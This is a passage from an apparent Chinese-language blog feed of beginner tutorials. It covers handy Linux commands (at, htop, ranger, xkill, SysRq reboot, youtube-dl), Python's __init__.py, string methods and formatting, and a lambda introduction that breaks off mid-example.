href="#‘在’特定的时间运行Linux命令" class="headerlink" title="‘在’特定的时间运行Linux命令"></a>‘在’特定的时间运行Linux命令</h3><p>‘nohup’命令在你用SSH连接到服务器，并在上面保持执行SSH登出前任务的时候十分有用。</p><p>想一下如果你需要在特定的时间执行相同的命令，这种情况该怎么办呢?</p><p>命令‘at’就能妥善解决这一情况。以下是‘at’使用示例。</p><p>at 10:38 PM Friat&gt; cowsay ‘hello’ at&gt; CTRL + D上面的命令能在周五下午10时38分运行程序cowsay。</p><p>使用的语法就是‘at’后追加日期时间。当at&gt;提示符出现后就可以输入你想在那个时间运行的命令了。</p><p>CTRL + D返回终端。</p><p>还有许多日期和时间的格式，都需要你好好翻一翻‘at’的man手册来找到更多的使用方式。</p><h3 id="Man手册"><a href="#Man手册" class="headerlink" title="Man手册"></a>Man手册</h3><p>Man手册会为你列出命令和参数的使用大纲，教你如何使用她们。Man手册看起来沉闷呆板。(我思忖她们也不是被设计来娱乐我们的)。</p><p>不过这不代表你不能做些什么来使她们变得漂亮些。</p><p>export PAGER=most你需要安装‘most’;她会使你的你的man手册的色彩更加绚丽。</p><p>你可以用以下命令给man手册设定指定的行长：</p><p>export MANWIDTH=80 ***，如果你有一个可用的浏览器，你可以使用-H在默认浏览器中打开任意的man页。</p><p>man -H 注意啦，以上的命令只有在你将默认的浏览器设置到环境变量$BROWSER中了之后才效果哟。</p><h3 id="使用htop查看和管理进程"><a href="#使用htop查看和管理进程" class="headerlink" title="使用htop查看和管理进程"></a>使用htop查看和管理进程</h3><p>你用哪个命令找出电脑上正在运行的进程的呢?我敢打赌是‘ps’并在其后加不同的参数来得到你所想要的不同输出。</p><p>安装‘htop’吧!绝对让你相见恨晚。</p><p>htop在终端中将进程以列表的方式呈现，有点类似于Windows中的任务管理器。你可以使用功能键的组合来切换排列的方式和展示出来的项。你也可以在htop中直接杀死进程。</p><p>在终端中简单的输入htop即可运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htop </span><br></pre></td></tr></table></figure><h3 id="使用ranger浏览文件系统"><a href="#使用ranger浏览文件系统" class="headerlink" title="使用ranger浏览文件系统"></a>使用ranger浏览文件系统</h3><p>如果说htop是命令行进程控制的好帮手，那么ranger就是命令行浏览文件系统的好帮手。</p><p>你在用之前可能需要先安装，不过一旦安装了以后就可以在命令行输入以下命令启动她：</p><p>ranger在命令行窗口中ranger和一些别的文件管理器很像，但是相比上下结构布局，她是左右结构的，这意味着你按左方向键你将前进到上一个文件夹，而右方向键则会切换到下一个。</p><p>在使用前ranger的man手册还是值得一读的，这样你就可以用快捷键操作ranger了。</p><h3 id="取消关机"><a href="#取消关机" class="headerlink" title="取消关机"></a>取消关机</h3><p>无论是在命令行还是图形用户界面关机后，才发现自己不是真的想要关机。</p><p>shutdown -c需要注意的是，如果关机已经开始则有可能来不及停止关机。</p><p>以下是另一个可以尝试命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill shutdown </span><br></pre></td></tr></table></figure><h3 id="杀死挂起进程的简单方法"><a href="#杀死挂起进程的简单方法" class="headerlink" title="杀死挂起进程的简单方法"></a>杀死挂起进程的简单方法</h3><p>想象一下，你正在运行的应用程序不明原因的僵死了。</p><p>你可以使用‘ps -ef’来找到该进程后杀掉或者使用‘htop’。</p><p>有一个更快、更容易的命令叫做xkill。</p><p>简单的在终端中输入以下命令并在窗口中点击你想杀死的应用程序。</p><p>xkill那如果整个系统挂掉了怎么办呢?</p><p>按住键盘上的‘alt’和‘sysrq’不放，然后慢慢输入以下键：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REISUB </span><br></pre></td></tr></table></figure><p>这样不按电源键你的计算机也能重启了。</p><h3 id="下载Youtube视频"><a href="#下载Youtube视频" class="headerlink" title="下载Youtube视频"></a>下载Youtube视频</h3><p>一般来说我们大多数人都喜欢看Youtube的视频，也会通过钟爱的播放器播放Youtube的流媒体。</p><p>如果你需要离线一段时间(比如：从苏格兰南部坐飞机到英格兰南部旅游的这段时间)那么你可能希望下载一些视频到存储设备中，到闲暇时观看。</p><p>你所要做的就是从包管理器中安装youtube-dl。</p><p>你可以用以下命令使用youtube-dl：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youtube-dl url-to-video </span><br></pre></td></tr></table></figure><p>你可以在Youtubu视频页面点击分享链接得到视频的url。只要简单的复制链接在粘帖到命令行就行了(要用shift + insert快捷键哟)。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>希望你在这篇文章中得到帮助，并且在这11条中找到至少一条让你惊叹“原来可以这样”的技巧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>来说说__init__.py文件</title>
      <link href="/posts/22682.html"/>
      <url>/posts/22682.html</url>
      
        <content type="html"><![CDATA[<p>当你去看一些 Python 相关的项目时，常常会看到 <strong>init</strong>.py，当你使用某些编辑器创建 Python Package 的时候，它也会自动给你生成一个 <strong>init</strong>.py 文件。</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095735.png"></p><p>这玩意有什么用呢？</p><p>我们知道， Python 中的包是可以包含多个 py 模块的，我们可以在不同的地方通过包名区分使用这些模块。</p><p>话不多说，咱们先来创建一下这样的目录：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095803.png"></p><p>我们在这里面创建了三个 Python 子包，里面都有 <strong>init</strong> 和 module 的 py 文件。</p><p>我们分别在不同包下的 <strong>init</strong> 中写一个 print 语句：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095338" alt="img"></p><p>接着我们进入 Python ，分别来导入这些模块：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095857.png"></p><p>可以看到，当我们导入父模块中的子模块的时候，它会优先执行父模块中的 init ，接着会执行指定模块中的 init。</p><p>当然，只是导入父模块的时候只会执行父模块中的 init：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095906.png"></p><p>也就是说，当我们去 import 一个 Package 的时候，它会隐性的去执行 <strong>init</strong>.py ， 而在 <strong>init</strong>.py 中定义的对象，会被绑定到当前的命名空间里面来。</p><p>比如有时候我们会这样去导入一个包下的所有模块，会这样操作：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095917.png"></p><p>但这个时候你会发现并没有将相关的子模块导入进来：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095944.png"></p><p>这时候你可能想到了，可以在父模块中的 <strong>init</strong>.py 做文章，先把它们导入进来不就行了：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429095951.png"></p><p>这里的 <strong>all</strong> 相当于导入 [] 里面定义的模块。</p><p>这次再导入：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429100000.png"></p><p>可以到，所有子模块就都一并导入进来了。</p><p>当然，你也可以在 <strong>init</strong>.py 做一些初始化的操作，比如数据库 session 的创建：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429100007.png"></p><p>其实在 Python3.2 版本之前，定义的 Package 下面一定要有 <strong>init</strong>.py 文件，这样 Python 才知道它是一个 Package，才可以寻找到相关模块的路径从而被 import。</p><p>而在 Python3.2 之后的版本就不需要再额外的去专门创建一个 <strong>init</strong>.py 来告诉 Python 它是一个 Package 了，因为现在创建的包叫 Namespace package， Python 可以自动搜寻 Package 路径，哪怕你的父包路径发生了改变，你在下次导入的时候， Python 还是会自动重新搜索包路径。</p><p>我们把刚刚定义的 <strong>init</strong> 都给删掉试试</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429100015.png"></p><p>接着我们在 Python3.8 版本导入看看：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429100021.png"></p><p>可以看到，尽管我们在 package 中没有定义 <strong>init</strong>.py，依然可以导入使用。</p><p>以同样的形式，我们在 Python2 中导入看看：</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/29/2020/04/29/20200429100028.png"></p><p>可以看到，它被整懵逼了…</p><p>综上，<strong>init</strong>.py 会在 import 的时候被执行，而空的 <strong>init</strong>.py 在 Python 新版本中已经不需要你额外去定义了，因为就算你不定义 init， Python 也知道你导入的包路径，但是如果你想要做一些初始化操作，或者像我们刚刚说的预先导入相关的模块，那么定义 <strong>init</strong>.py 还是很有必要的哟。</p><p>希望对你有帮助，那么我们下回见，<strong>peace！</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全python字符串操作指南</title>
      <link href="/posts/50672.html"/>
      <url>/posts/50672.html</url>
      
        <content type="html"><![CDATA[<h3 id="字符串的定义"><a href="#字符串的定义" class="headerlink" title="字符串的定义"></a><strong>字符串的定义</strong></h3><p>日常编码中，大家会发现，太多时候我们需要对数据进行处理，而这数据不管是数组、列表、字典，最终都逃不开字符串的处理。<br>所以今天要来跟大家发散的聊聊<strong>字符串</strong>！<br>估计很多人看到是将字符串肯定觉得索然无味(老子都会)，可大佬们不妨再往下看看？</p><p><img src="https://gitee.com/djgzs_admin/ArticleImg/raw/master/2020/04/28/2020/04/28/20200428221803" alt="img"></p><p>python定义字符、字符串没有java那样的严格，不管是单引号、双引号、甚至是三个单引号和双引号都可以用来定义字符(串)，只要成对出现即可。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单个字符</span></span><br><span class="line">a=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="comment"># 使用单引号定义字符串</span></span><br><span class="line">name=<span class="string">&#x27;Uranus&#x27;</span></span><br><span class="line"><span class="comment"># 使用双引号定义字符串</span></span><br><span class="line">code = <span class="string">&quot;Hello World ...&quot;</span></span><br><span class="line"><span class="comment"># 既然说到了string，怎么能不点开源码看看呢？</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">str</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    str(object=&#x27;&#x27;) -&gt; str</span></span><br><span class="line"><span class="string">    str(bytes_or_buffer[, encoding[, errors]]) -&gt; str</span></span><br><span class="line"><span class="string">    Create a new string object from the given object. If encoding or</span></span><br><span class="line"><span class="string">    errors is specified, then the object must expose a data buffer</span></span><br><span class="line"><span class="string">    that will be decoded using the given encoding and error handler.</span></span><br><span class="line"><span class="string">    Otherwise, returns the result of object.__str__() (if defined)</span></span><br><span class="line"><span class="string">    or repr(object).</span></span><br><span class="line"><span class="string">    encoding defaults to sys.getdefaultencoding().</span></span><br><span class="line"><span class="string">    errors defaults to &#x27;strict&#x27;.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>虽然这些不是主要说的，但还是简单提下，三个单引号或者双引号，主要是用来作为文档注释的，请不要拿来定义字符串(虽然这样并不会出现语法错误)。<br>今天主要说下关于打段的字符串应该如何定义，PEP8有规定，一行代码的长度请勿超过120个字符。那么如果遇到这种情况，该怎么办？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不推荐的使用方式：</span></span><br><span class="line">line = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Create a new string object from the given object.</span></span><br><span class="line"><span class="string">If encoding or errors is specified,</span></span><br><span class="line"><span class="string">then the object must expose a data buffer that will be</span></span><br><span class="line"><span class="string">decoded using the given encoding and error handler.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 或者这样</span></span><br><span class="line">line = <span class="string">&quot;Create a new string object from the given object. &quot;</span> \</span><br><span class="line">       <span class="string">&quot;If encoding or errors is specified,&quot;</span> \</span><br><span class="line">       <span class="string">&quot;then the object must expose a data buffer that will be&quot;</span> \</span><br><span class="line">       <span class="string">&quot; decoded using the given encoding and error handler.&quot;</span></span><br><span class="line"><span class="comment"># 更好的实现方式：</span></span><br><span class="line">line = (<span class="string">&quot;Create a new string object from the given object.&quot;</span></span><br><span class="line">        <span class="string">&quot;If encoding or errors is specified,&quot;</span></span><br><span class="line">        <span class="string">&quot;then the object must expose a data buffer that will be &quot;</span></span><br><span class="line">        <span class="string">&quot;decoded using the given encoding and error handler.&quot;</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h3 id="字符串中-is-的用法"><a href="#字符串中-is-的用法" class="headerlink" title="字符串中.is()的用法"></a><strong>字符串中.is()的用法</strong></h3><p><strong>.is*()</strong>, 既然是is，那么它返回的结果只有两种，True or False<br><strong>先来对比一下数字：</strong></p><blockquote><p>isdigit()<br>True: Unicode数字，byte数字（单字节），全角数字（双字节），罗马数字<br>False: 汉字数字<br>Error: 无</p><p>isdecimal()<br>True: Unicode数字，全角数字（双字节）<br>False: 罗马数字，汉字数字<br>Error: byte数字（单字节）</p><p>isnumeric()<br>True: Unicode数字，全角数字（双字节），罗马数字，汉字数字<br>False: 无<br>Error: byte数字（单字节)</p></blockquote><p>总结几个偏门知识点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;①②③④⑤&#x27;</span></span><br><span class="line">isdigit()、isnumeric() 为<span class="literal">True</span> isdecimal()为<span class="literal">False</span></span><br><span class="line">b=<span class="string">&#x27;一壹&#x27;</span></span><br><span class="line">isnumeric()会认为是<span class="literal">True</span>的哦！</span><br></pre></td></tr></table></figure><p><strong>再来看一个等式：</strong></p><blockquote><p>isalnum() = isdigit() + isalpha() + isspace()<br>isdigit()表示字符串内全部为数字<br>isalpha()表示字符串内全部为字符<br>isspace()表示字符串有一个或多个空格组成<br>isalnum()表示字符串内全部为数字和字符</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;12345&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;①②③④⑤&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;abc123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.isdigit()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(b.isalpha()) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(c.isalnum()) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p><strong>针对字符串大小写的方法：</strong></p><blockquote><p>.isupper() 字符串全部由大写组成<br>.islower() 字符串全部由小写组成<br>.istitle() 字符串形式为驼峰命名，eg:”Hello World”</p></blockquote><p>以上这些用法去掉is，则变为了对应的字符串转发方法。学一套会两套，买一送一….</p><p>最后说一个不带.的is* — isinstance(obj,type)</p><blockquote><p>判断一个object是什么类型…<br>type可选类型为：int，float，bool，complex，str，bytes，unicode，list，dict，set，tuple<br>并且type可以为一个原组：isinstance(obj, (str, int))</p></blockquote><h3 id="判断字符串中的内容"><a href="#判断字符串中的内容" class="headerlink" title="判断字符串中的内容"></a><strong>判断字符串中的内容</strong></h3><p>.*with() starts ends 不仅支持开头结尾的匹配，还支持start和end两个参数来动态定义字符串的index位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">long_string = <span class="string">&quot;To live is to learn，to learn is to better live&quot;</span></span><br><span class="line">long_string.startswith(<span class="string">&#x27;To&#x27;</span>)</span><br><span class="line">long_string.startswith(<span class="string">&#x27;li&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">long_string.endswith(<span class="string">&#x27;live&#x27;</span>)</span><br><span class="line">long_string.endswith(<span class="string">&#x27;live&#x27;</span>, <span class="number">0</span>, <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>同样支持start、end来判断字符串的还有 .find()、.rfind()和 .index()、.rindex()<br>这两类字符串寻址方法均支持从左到右、从右至左两种寻址方式，不同的是：<br>find在未找到时，返回-1，而index在未找到时，会抛出ValueError的异常…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">long_string.index(<span class="string">&#x27;live&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">long_string.rindex(<span class="string">&#x27;live&#x27;</span>) <span class="comment"># 42</span></span><br></pre></td></tr></table></figure><h3 id="字符串的内容变更"><a href="#字符串的内容变更" class="headerlink" title="字符串的内容变更"></a><strong>字符串的内容变更</strong></h3><p>狭义来说使用，字符串的替换使用.replace()即可，那为什么还要单独说呢？因为它有一个可选参数<strong>count</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">long_string = <span class="string">&quot;To live is to learn，to learn is to better live&quot;</span></span><br><span class="line">long_string.count(<span class="string">&#x27;live&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">long_string.replace(<span class="string">&#x27;live&#x27;</span>,<span class="string">&#x27;Live&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">output:</span><br><span class="line"><span class="string">&#x27;To Live is to learn，to learn is to better live&#x27;</span></span><br><span class="line"><span class="comment"># 可以看到，第二个live并未进行替换</span></span><br></pre></td></tr></table></figure><p><strong>刚才说了狭义，那么广义呢？</strong></p><ol><li><p><strong>(l/r)strip()</strong></p><p>将字符串左、右、两端的特定字符过滤掉，默认为空格…<br>strip()要注意的地方是，strip(‘TolLive’) 中的字符并非完整匹配，而是针对每一个字符进行匹配，说起来混，直接上例子：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">long_string = <span class="string">&quot;To live is to learn，to learn is to better live&quot;</span></span><br><span class="line">long_string.strip(<span class="string">&#x27;TolLive&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;s to learn，to learn is to better&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>字符串切片</strong></p><p>字符串的切片分为long_string[start:end;step] start、end区间为左闭右开…这个网上说的太多了，再拉出来详细讲就要挨打了…</p><p><strong>(l/r)just(width,[fillchar])、center(width, [fillchar])、zfill(width)</strong><br>这些均为填充固定长度的字符，默认使用空格(zfill为左补0，z是zero的意思…),看意思就明白了，不用多讲了….</p></li></ol><h3 id="字符串格式化输出"><a href="#字符串格式化输出" class="headerlink" title="字符串格式化输出"></a><strong>字符串格式化输出</strong></h3><p>本来fill和center等可以放在这里，但是他们使用频率和重量级不够格，就丢在上面了。<br>Python格式化输出分为<strong>两类</strong>，那是在pyton2的时代，即 % 和 format。这两种网上的资料太多了，说的太多显得没逼格…<br>但，还是要简单说说其中特殊的地方</p><ol><li><p><strong>% 格式化输出：</strong></p><ul><li>如何在%的格式输出中，输出用来看做标记为的%符号呢？使用两个百分号（%%）</li><li>%(-)(width) width为设置长度，默认左填充空格，添加-号为右填充</li><li>.width代表字符串截断，保留多少长度的字符串</li><li>type %s字符串 %d十进制整数  %f小数 …</li><li>多个参数是，后面的参数需要使用括号包裹起来</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;姓名：%-5s 年龄：%4d 爱好： %.8s&#x27;</span> % (<span class="string">&#x27;王大锤&#x27;</span>,<span class="number">30</span>,<span class="string">&#x27;python、Java&#x27;</span>)</span><br><span class="line">output：</span><br><span class="line"><span class="string">&#x27;姓名：王大锤   年龄：  30 爱好：python、J&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>format格式输出：</strong></p><p>format在python3开始官方就表示为替换%的输出方式，之所以还保留着%，主要是为了兼容性考虑…</p><ul><li>对比%，format使用花括号{}表示变量</li><li>&lt; &gt; ^ 代表了format的对齐方式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#123;:-^40s&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;华丽的分割线&#x27;</span>)</span><br><span class="line">output:</span><br><span class="line"><span class="string">&#x27;-----------------华丽的分割线-----------------&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><strong>f-string</strong></p><p>Python3.6的版本更新时，新增了f-string，英文好的可以去看官方解释PEP 498 – Literal String Interpolation 。<br>f-string是字符串引号前以f/F开头，并使用{}标注替换位置的使用形式。<br>之所以官方推出f-string，主要是因为它的更高的性能、更强的功能。例子走起：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;Uranus&#x27;</span></span><br><span class="line"><span class="string">f&#x27;Hello,<span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">f&#x27;Hello,<span class="subst">&#123;name.lower()&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">f&#x27;Hello,<span class="subst">&#123;name:^10s&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">f&#x27;Hello,<span class="subst">&#123;(<span class="keyword">lambda</span> x: x*<span class="number">2</span>) (name)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="string">&#x27;Hello,Uranus&#x27;</span></span><br><span class="line"><span class="string">&#x27;Hello,uranus&#x27;</span></span><br><span class="line"><span class="string">&#x27;Hello,  Uranus  &#x27;</span></span><br><span class="line"><span class="string">&#x27;Hello,UranusUranus&#x27;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中lambda的使用，与它的三个好基友介绍！</title>
      <link href="/posts/18713.html"/>
      <url>/posts/18713.html</url>
      
        <content type="html"><![CDATA[<h3 id="匿名函数lambda"><a href="#匿名函数lambda" class="headerlink" title="匿名函数lambda"></a>匿名函数lambda</h3><p>除了def语句，python还提供了一种生成函数对象的表达式形式。由于它与LISP语言中的一个工具类似，所以称为lambda。<br>就像def一样，这个表达式创建了一个之后能够调用的函数，但是它返回一个函数而不是将这个函数赋值给一个变量。这些就是lambda叫做匿名函数的原因。实际上，他常常以一种行内进行函数定义的方式使用，或者用作推迟执行一些代码。<br>lambda的一般形式是关键字lambda之后跟着一个或多个参数（与一个def头部内用括号括起来的参数列表类似），紧跟着是一个<strong>冒号</strong>，之后是表达式</p><blockquote><p>lambda arg1，arg2,argn:expression using arguments</p></blockquote><p>由lambda表达式所返回的函数对象与由def创建并复制后的函数对象工作起来是完全一致的，但lambda有一些不同之处，让其扮演特定的角色时更有用：</p><h6 id="lambda是一个表达式，而不是一个语句"><a href="#lambda是一个表达式，而不是一个语句" class="headerlink" title="lambda是一个表达式，而不是一个语句"></a>lambda是一个表达式，而不是一个语句</h6><p>因为这一点，lambda可以出现在python语法不允许def出现的地方。<br>此外，作为一个表达式，lambda返回一个值（一个新的函数），可以选择性的赋值给一个变量<br>相反，def语句总是得在头部将一个新的函数赋值给一个变量，而不是将这个函数作为结果返回。</p><h6 id="lambda的主题是单个表达式，而不是一个代码块"><a href="#lambda的主题是单个表达式，而不是一个代码块" class="headerlink" title="lambda的主题是单个表达式，而不是一个代码块"></a>lambda的主题是单个表达式，而不是一个代码块</h6><p>这个lambda的主题简单的就好像放在def主体return语句中的代码一样。<br>简单的将结果写成一个顺畅的表达式，而不是明确的返回。<br>但由于它仅限于表达式，故lambda通常要比def功能少…你仅能够在lambda主体中封装有限的逻辑进去，因为他是一个为编写简单函数而设计的。<br>除了上述这些差别，def和lambda都能过做同样种类的工作</p><p>def与lambda的相同用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">lambda</span> x, y, z: x + y + z</span><br><span class="line">x(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span></span><br><span class="line"></span><br><span class="line">y = (<span class="keyword">lambda</span> a=<span class="string">&#x27;hello&#x27;</span>, b=<span class="string">&#x27;world&#x27;</span>: a + b)</span><br><span class="line">y(b=<span class="string">&#x27;清风&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;hello清风&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="为什么使用lambda"><a href="#为什么使用lambda" class="headerlink" title="为什么使用lambda"></a>为什么使用lambda</h3><p>看过上面的两个小例子，很多人会说这个和def没什么差别，我们又为什么要使用lambda呢？通常来说，lambda起到一种函数的速写作用，允许在使用的代码内嵌一个函数的定义，他完全是可选的(是可以使用def代替他们)，但是在你仅需要切入一段可执行代码的情况下，它会带来一个更简洁的书写效果。</p><p>lambda通常用来编写跳转表，也就是行为的列表或者字典，能够按照需求执行操作，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="keyword">lambda</span> x: x ** <span class="number">2</span>, <span class="keyword">lambda</span> x: x ** <span class="number">3</span>, <span class="keyword">lambda</span> x: x ** <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> l:</span><br><span class="line">    <span class="built_in">print</span>(f(<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">0</span>](<span class="number">3</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">9</span></span><br></pre></td></tr></table></figure><p>当需要把小段的可执行代码编写进def语句从语法上不能实现的地方是，lambda表达式作为def的一种速写来说，是最为有用的，如果上面的代码用def编写，则变为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f3</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">4</span></span><br><span class="line"></span><br><span class="line">l = [f1, f2, f3]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> l:</span><br><span class="line">    <span class="built_in">print</span>(f(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">0</span>](<span 